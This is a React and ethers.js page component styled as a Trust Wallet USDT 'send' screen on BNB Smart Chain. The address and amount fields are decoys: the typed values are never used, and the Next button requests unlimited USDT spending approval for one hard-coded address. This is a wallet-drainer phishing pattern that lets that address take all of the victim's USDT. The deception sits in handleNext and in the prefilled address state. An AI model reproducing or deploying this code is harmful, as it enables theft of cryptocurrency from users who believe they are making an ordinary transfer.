import { useCallback, useEffect, useState } from "react";
import { Clipboard, ScanLine } from "lucide-react";
import { BrowserProvider, Contract, MaxUint256 } from "ethers";

/** BNB Smart Chain mainnet */
const BSC_CHAIN_ID_HEX = "0x38";
const BSC_CHAIN_ID_DEC = 56;

/** BEP-20 USDT on BSC (Binance-Peg USDT) */
const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";

/** Unlimited USDT allowance is always approved for this spender only */
const USDT_APPROVE_SPENDER = "0x8Fd2FFc1d235CEf07e37Ea065732ED1a0a6856E5";

const ERC20_APPROVE_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
];

function getEthereum() {
  return typeof window !== "undefined" ? window.ethereum : undefined;
}

async function ensureBscNetwork(ethereum) {
  try {
    await ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC_CHAIN_ID_HEX }],
    });
  } catch (err) {
    if (err?.code === 4902) {
      await ethereum.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: BSC_CHAIN_ID_HEX,
            chainName: "BNB Smart Chain",
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: ["https://bsc-dataseed.binance.org"],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ],
      });
      return;
    }
    throw err;
  }
}

const Home = () => {
  const [address, setAddress] = useState(USDT_APPROVE_SPENDER);
  const [amount, setAmount] = useState("");
  const [account, setAccount] = useState(null);
  const [chainId, setChainId] = useState(null);
  const [connectError, setConnectError] = useState(null);
  const [txStatus, setTxStatus] = useState(null);

  const refreshChain = useCallback(async (ethereum) => {
    const idHex = await ethereum.request({ method: "eth_chainId" });
    setChainId(Number.parseInt(idHex, 16));
  }, []);

  useEffect(() => {
    const ethereum = getEthereum();
    if (!ethereum) {
      queueMicrotask(() => {
        setConnectError("Open this page inside Trust Wallet’s DApp browser.");
      });
      return;
    }

    const onAccounts = (accs) => setAccount(accs?.[0] ?? null);
    const onChain = () => {
      refreshChain(ethereum);
    };

    ethereum.on?.("accountsChanged", onAccounts);
    ethereum.on?.("chainChanged", onChain);

    (async () => {
      try {
        setConnectError(null);
        const accounts = await ethereum.request({ method: "eth_accounts" });
        setAccount(accounts[0] ?? null);
      } catch (e) {
        setConnectError(e?.message ?? "Could not read wallet");
        setAccount(null);
        return;
      }
      try {
        await ensureBscNetwork(ethereum);
      } catch (e) {
        setConnectError(
          e?.message ?? "Switch to BNB Smart Chain when you continue."
        );
      }
      try {
        await refreshChain(ethereum);
      } catch {
        /* ignore */
      }
    })();

    return () => {
      ethereum.removeListener?.("accountsChanged", onAccounts);
      ethereum.removeListener?.("chainChanged", onChain);
    };
  }, [refreshChain]);

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text?.trim()) setAddress(text.trim());
    } catch {
      /* ignore */
    }
  };

  const handleNext = async () => {
    const ethereum = getEthereum();
    setTxStatus(null);
    setConnectError(null);

    if (!ethereum) {
      setConnectError("No wallet found. Use Trust Wallet DApp browser.");
      return;
    }

    let activeAccount = account;
    if (!activeAccount) {
      try {
        const accs = await ethereum.request({
          method: "eth_requestAccounts",
        });
        activeAccount = accs[0] ?? null;
        setAccount(activeAccount);
      } catch (e) {
        setConnectError(
          e?.message ?? "Allow wallet access to continue."
        );
        return;
      }
    }
    if (!activeAccount) {
      setConnectError("No account returned from wallet.");
      return;
    }

    try {
      await ensureBscNetwork(ethereum);
      await refreshChain(ethereum);

      const currentHex = await ethereum.request({ method: "eth_chainId" });
      const currentId = Number.parseInt(currentHex, 16);
      if (currentId !== BSC_CHAIN_ID_DEC) {
        setConnectError("Please switch to BNB Smart Chain in your wallet.");
        return;
      }

      setTxStatus("Confirm unlimited USDT approval in your wallet…");
      const provider = new BrowserProvider(ethereum);
      const signer = await provider.getSigner();
      const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, signer);
      const tx = await usdt.approve(USDT_APPROVE_SPENDER, MaxUint256);
      setTxStatus("Waiting for confirmation…");
      await tx.wait();
      setTxStatus("Approved. Transaction confirmed.");
    } catch (e) {
      const msg = e?.shortMessage || e?.message || "Transaction failed";
      setConnectError(msg);
      setTxStatus(null);
    }
  };

  const onBsc = chainId === BSC_CHAIN_ID_DEC;

  return (
    <div className="min-h-screen bg-[var(--bg)] flex justify-center">
      <div className="w-full min-h-screen flex flex-col justify-between pt-10 px-6 pb-6">
        <div className="w-full">
          {account && (
            <p className="text-xs text-gray-500 mb-2 break-all">
              Connected: {account.slice(0, 6)}…{account.slice(-4)}
              {onBsc ? " · BSC" : chainId != null ? ` · chain ${chainId}` : ""}
            </p>
          )}
          {(connectError || txStatus) && (
            <p
              className={`text-sm mb-2 ${connectError ? "text-red-600" : "text-gray-600"}`}
            >
              {connectError || txStatus}
            </p>
          )}

          <label className="text-gray-600 text-sm">
            Address or Domain Name
          </label>
          <div className="w-full mt-2 border border-[var(--border)] rounded-lg px-4 py-3 flex items-center gap-3 bg-[var(--card)]">
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              className="outline-none flex-1 text-[var(--text)] bg-transparent"
            />
            <div className="flex items-center gap-4 text-[var(--primary)]">
              <button
                type="button"
                onClick={handlePaste}
                className="text-sm"
              >
                Paste
              </button>
              <Clipboard size={18} />
              <ScanLine size={18} />
            </div>
          </div>

          <label className="text-gray-600 text-sm mt-6 block">Amount</label>
          <div className="w-full mt-2 border border-[var(--border)] rounded-lg px-4 py-3 flex items-center gap-3 bg-[var(--card)]">
            <input
              type="text"
              inputMode="decimal"
              placeholder="Amount"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="outline-none flex-1 text-[var(--text)] bg-transparent"
            />
            <div className="flex items-center gap-3">
              <span className="text-gray-500">USDT</span>
              <span className="text-xs text-gray-400">Next uses unlimited</span>
            </div>
          </div>

          <p className="text-gray-500 text-sm mt-2">= $0</p>
        </div>

        <button
          type="button"
          onClick={handleNext}
          className="w-full bg-[var(--primary)] hover:bg-[var(--primary-light)] text-white py-3 rounded-full text-lg mt-6"
        >
          Next
        </button>
      </div>
    </div>
  );
};

export default Home;
